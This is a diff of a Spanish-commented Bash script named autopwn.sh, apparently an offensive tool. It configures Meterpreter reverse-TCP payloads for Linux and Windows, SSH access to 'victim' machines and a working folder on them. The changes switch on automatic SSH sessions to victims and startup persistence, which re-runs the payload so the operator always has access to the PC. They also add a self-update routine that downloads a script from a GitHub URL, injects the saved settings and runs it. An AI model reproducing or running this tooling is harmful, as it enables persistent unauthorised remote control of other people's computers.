@@ -1,6 +1,6 @@
 #!/bin/bash
 
-version="1.7"
+version="1.8"
 
 # Variables
 youripalways=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
@@ -22,9 +22,9 @@ sshpassword="kali"
 winworkdir="Desktop" # la carpeta de la victima donde todo el proceso se llevara a cabo
 linworkdir="Desktop" # la carpeta de la victima donde todo el proceso se llevara a cabo
 
-sshstarttoo="no" # abre una terminal de ssh automaticamnete cuando se conecta a una victima
+sshstarttoo="si" # abre una terminal de ssh automaticamnete cuando se conecta a una victima
 autoroot="si" # comprueba si la victima tiene root
-startup="no" # añade el payload al inicio para que siempre tengas acceso al PC
+startup="si" # añade el payload al inicio para que siempre tengas acceso al PC
 
 # NO PONER ESPACIOS EN LOS NOMBRES, USA BARRA BAJA EN SU LUGAR.
 linuxoutname="writer.elf"
@@ -37,10 +37,10 @@ webcon="`curl -s "https://raw.githubusercontent.com/pepemanaca/hthethrfdt/main/a
 color_transition() {
     while true; do
     	clear
-        echo -e "\e[31mTIENES UNA VERSION DESACTUALIZADA, PULSA ENTER PARA ACTUALIZAR.\e[0m"
+        echo -e "\e[31mTIENES UNA VERSION DESACTUALIZADA, PULSA ENTER PARA ACTUALIZAR. (ALGUNOS DE TUS DATOS CONFIGURADOS PUEDEN RESETEARSE)\e[0m"
         sleep 0.1
         clear
-        echo -e "\e[37mTIENES UNA VERSION DESACTUALIZADA, PULSA ENTER PARA ACTUALIZAR.\e[0m"
+        echo -e "\e[37mTIENES UNA VERSION DESACTUALIZADA, PULSA ENTER PARA ACTUALIZAR. (ALGUNOS DE TUS DATOS CONFIGURADOS PUEDEN RESETEARSE)\e[0m"
         sleep 0.1
     done
 }
@@ -60,6 +60,22 @@ else
     done
     clear
     chmod 777 autopwn.sh
+
+    replace "linux/x86/meterpreter/reverse_tcp" "$linuxpayload" -- autopwn.sh
+    replace "windows/meterpreter/reverse_tcp" "$windowspayload" -- autopwn.sh
+    replace "127.0.0.1" "$lhost" -- autopwn.sh
+    replace 'winlport="8181"' "winlport=\"$winlport\"" -- autopwn.sh
+    replace 'linlport="8080"' "linlport=\"$linlport\"" -- autopwn.sh
+    replace 'sshuser="kali"' "sshuser=\"$sshuser\"" -- autopwn.sh
+    replace 'sshpassword="kali"' "sshpassword=\"$sshpassword\"" -- autopwn.sh
+    replace 'winworkdir="Desktop"' "winworkdir=\"$winworkdir\"" -- autopwn.sh
+    replace 'linworkdir="Desktop"' "linworkdir=\"$winworkdir\"" -- autopwn.sh
+    replace 'sshstarttoo="si"' "sshstarttoo=\"$sshstarttoo\"" -- autopwn.sh
+    replace 'autoroot="si"' "autoroot=\"$autoroot\"" -- autopwn.sh
+    replace 'startup="si"' "startup=\"$startup\"" -- autopwn.sh
+    replace 'linuxoutname="writer.elf"' "linuxoutname=\"$linuxoutname\"" -- autopwn.sh
+    replace 'windowsoutname="writer.exe"' "windowsoutname=\"$windowsoutname\"" -- autopwn.sh
+
     dos2unix autopwn.sh
     ./autopwn.sh
 fi
